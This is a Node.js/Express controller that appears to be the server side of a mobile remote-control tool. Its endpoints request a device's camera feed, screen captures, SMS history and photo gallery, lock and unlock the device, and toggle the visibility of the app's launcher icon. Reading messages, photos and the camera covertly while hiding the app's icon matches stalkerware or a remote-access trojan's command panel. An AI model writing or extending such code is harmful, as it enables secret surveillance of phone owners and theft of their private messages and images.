const Device = require('../models/Device');
const ActivityLog = require('../models/ActivityLog');
const { emitEvent } = require('../config/socket');
const logger = require('../utils/logger');

exports.getCameraFeed = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.userId;

    const device = await Device.findOne({ 
      deviceId, 
      deletedAt: null,
      userId,
    });

    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found',
      });
    }

    // Log access
    await ActivityLog.log({
      userId,
      deviceId: device._id,
      action: 'camera_access',
      details: { type: 'camera_feed' },
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
    });

    // Emit camera request to device
    emitEvent('camera:request', { deviceId }, `device:${device._id}`);

    res.json({
      success: true,
      message: 'Camera feed request sent',
      data: {
        deviceId: device._id,
        status: 'pending',
        timestamp: new Date().toISOString(),
      },
    });
  } catch (error) {
    logger.error('Get camera feed error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to access camera',
    });
  }
};

exports.getScreenCapture = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.userId;

    const device = await Device.findOne({ 
      deviceId, 
      deletedAt: null,
      userId,
    });

    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found',
      });
    }

    // Log access
    await ActivityLog.log({
      userId,
      deviceId: device._id,
      action: 'screen_access',
      details: { type: 'screen_capture' },
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
    });

    // Emit screen capture request to device
    emitEvent('screen:request', { deviceId }, `device:${device._id}`);

    res.json({
      success: true,
      message: 'Screen capture request sent',
      data: {
        deviceId: device._id,
        status: 'pending',
        timestamp: new Date().toISOString(),
      },
    });
  } catch (error) {
    logger.error('Get screen capture error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to capture screen',
    });
  }
};

exports.getSmsHistory = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { limit = 50, page = 1 } = req.query;
    const userId = req.userId;

    const device = await Device.findOne({ 
      deviceId, 
      deletedAt: null,
      userId,
    });

    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found',
      });
    }

    // Log access
    await ActivityLog.log({
      userId,
      deviceId: device._id,
      action: 'sms_access',
      details: { limit, page },
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
    });

    // Emit SMS history request to device
    emitEvent('sms:request', { 
      deviceId, 
      limit: parseInt(limit),
      page: parseInt(page),
    }, `device:${device._id}`);

    res.json({
      success: true,
      message: 'SMS history request sent',
      data: {
        deviceId: device._id,
        status: 'pending',
        timestamp: new Date().toISOString(),
      },
    });
  } catch (error) {
    logger.error('Get SMS history error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get SMS history',
    });
  }
};

exports.getGallery = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { type = 'all', limit = 50, page = 1 } = req.query;
    const userId = req.userId;

    const device = await Device.findOne({ 
      deviceId, 
      deletedAt: null,
      userId,
    });

    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found',
      });
    }

    // Log access
    await ActivityLog.log({
      userId,
      deviceId: device._id,
      action: 'gallery_access',
      details: { type, limit, page },
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
    });

    // Emit gallery request to device
    emitEvent('gallery:request', { 
      deviceId,
      type,
      limit: parseInt(limit),
      page: parseInt(page),
    }, `device:${device._id}`);

    res.json({
      success: true,
      message: 'Gallery request sent',
      data: {
        deviceId: device._id,
        status: 'pending',
        timestamp: new Date().toISOString(),
      },
    });
  } catch (error) {
    logger.error('Get gallery error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to get gallery',
    });
  }
};

exports.lockDevice = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { message } = req.body;
    const userId = req.userId;

    const device = await Device.findOne({ 
      deviceId, 
      deletedAt: null,
      userId,
    });

    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found',
      });
    }

    // Lock device
    device.status = 'maintenance';
    await device.save();

    // Log access
    await ActivityLog.log({
      userId,
      deviceId: device._id,
      action: 'device_lock',
      details: { message },
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
    });

    // Emit lock command to device
    emitEvent('device:lock', { deviceId, message }, `device:${device._id}`);

    res.json({
      success: true,
      message: 'Device lock command sent',
      data: device,
    });
  } catch (error) {
    logger.error('Lock device error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to lock device',
    });
  }
};

exports.unlockDevice = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.userId;

    const device = await Device.findOne({ 
      deviceId, 
      deletedAt: null,
      userId,
    });

    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found',
      });
    }

    // Unlock device
    device.status = 'online';
    await device.save();

    // Log access
    await ActivityLog.log({
      userId,
      deviceId: device._id,
      action: 'device_unlock',
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
    });

    // Emit unlock command to device
    emitEvent('device:unlock', { deviceId }, `device:${device._id}`);

    res.json({
      success: true,
      message: 'Device unlock command sent',
      data: device,
    });
  } catch (error) {
    logger.error('Unlock device error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to unlock device',
    });
  }
};

exports.setLauncherVisibility = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { visibility } = req.body;
    const userId = req.userId;

    const device = await Device.findOne({ 
      deviceId, 
      deletedAt: null,
      userId,
    });

    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found',
      });
    }

    // Update settings
    device.settings = device.settings || {};
    device.settings.launcherVisibility = visibility;
    await device.save();

    // Log access
    await ActivityLog.log({
      userId,
      deviceId: device._id,
      action: 'settings_update',
      details: { launcherVisibility: visibility },
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
    });

    // Emit launcher visibility command to device
    emitEvent('launcher:visibility', { deviceId, visibility }, `device:${device._id}`);

    res.json({
      success: true,
      message: 'Launcher visibility updated',
      data: device,
    });
  } catch (error) {
    logger.error('Set launcher visibility error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to update launcher visibility',
    });
  }
};
